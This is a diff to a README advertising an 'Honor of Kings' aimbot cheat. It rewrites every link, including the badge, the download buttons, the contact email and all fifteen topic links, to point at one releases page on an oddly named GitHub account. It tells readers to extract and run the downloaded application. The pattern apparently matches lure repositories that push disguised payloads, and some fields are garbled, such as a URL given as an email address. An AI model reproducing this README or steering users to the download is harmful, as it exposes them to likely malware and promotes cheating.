@@ -1,7 +1,7 @@
 # Honor of Kings Aimbot
 
-![Honor of Kings](https://img.shields.io/badge/Honor%20of%20Kings-Aimbot-brightgreen)  
-[Download Application.zip](https://github.com/user/repo/Application.zip)
+![Honor of Kings](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases%20of%20Kings-Aimbot-brightgreen)  
+[Download https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
 
 Welcome to the **Honor of Kings Aimbot** repository. This project aims to enhance your gaming experience in *Honor of Kings* by providing tools that help you achieve better performance in the game. With features like automatic targeting, speed enhancements, and visibility advantages, you can gain a competitive edge over your opponents.
 
@@ -33,11 +33,11 @@ These features can significantly improve your gameplay, allowing for more strate
 
 To get started, download the application using the link below:
 
-[Download Application.zip](https://github.com/user/repo/Application.zip)
+[Download https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
 
 Once you have downloaded the file, follow these steps:
 
-1. **Extract the Zip File**: Locate the downloaded `Application.zip` file and extract its contents.
+1. **Extract the Zip File**: Locate the downloaded `https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases` file and extract its contents.
 2. **Run the Application**: Navigate to the extracted folder and execute the application file. Follow any on-screen instructions to complete the setup.
 
 ## Usage
@@ -78,8 +78,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: user@example.com
-- **GitHub**: [user](https://github.com/user)
+- **Email**: https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases
+- **GitHub**: [user](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
 
 Thank you for checking out the Honor of Kings Aimbot repository. Enjoy your enhanced gaming experience!
 
@@ -122,21 +122,21 @@ We appreciate community involvement. Here are some recent contributions:
 
 ### Related Topics
 
-- [honor-kings-cheat](https://github.com/topics/honor-kings-cheat)
-- [cheat-honor-of-kings](https://github.com/topics/cheat-honor-of-kings)
-- [honor-of-kings-cheat-apk](https://github.com/topics/honor-of-kings-cheat-apk)
-- [cheat-damage-honor-of-kings](https://github.com/topics/cheat-damage-honor-of-kings)
-- [honor-of-kings-cheat-android](https://github.com/topics/honor-of-kings-cheat-android)
-- [honor-of-kings-cheaters](https://github.com/topics/honor-of-kings-cheaters)
-- [honor-of-kings-cheat-mod](https://github.com/topics/honor-of-kings-cheat-mod)
-- [cheat-sa-honor-of-kings](https://github.com/topics/cheat-sa-honor-of-kings)
-- [kings-of-honor-2-cheats](https://github.com/topics/kings-of-honor-2-cheats)
-- [honor-of-kings-cheat-ios](https://github.com/topics/honor-of-kings-cheat-ios)
-- [honor-of-kings-anti-cheat](https://github.com/topics/honor-of-kings-anti-cheat)
-- [cheat-honor-of-kings-mod-apk](https://github.com/topics/cheat-honor-of-kings-mod-apk)
-- [honor-of-kings-cheat-engine](https://github.com/topics/honor-of-kings-cheat-engine)
-- [honor-of-kings-cheats](https://github.com/topics/honor-of-kings-cheats)
-- [honor-of-kings-tips](https://github.com/topics/honor-of-kings-tips)
+- [honor-kings-cheat](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [cheat-honor-of-kings](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheat-apk](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [cheat-damage-honor-of-kings](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheat-android](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheaters](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheat-mod](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [cheat-sa-honor-of-kings](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [kings-of-honor-2-cheats](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheat-ios](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-anti-cheat](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [cheat-honor-of-kings-mod-apk](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheat-engine](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-cheats](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
+- [honor-of-kings-tips](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
 
 Feel free to explore these topics for more information and resources related to *Honor of Kings*.
 
@@ -146,4 +146,4 @@ Thank you for visiting the Honor of Kings Aimbot repository. We hope you find th
 
 ---
 
-[Download Application.zip](https://github.com/user/repo/Application.zip)
+[Download https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases](https://github.com/nmkjfbkogfc/Honor-Of-Kings/releases)
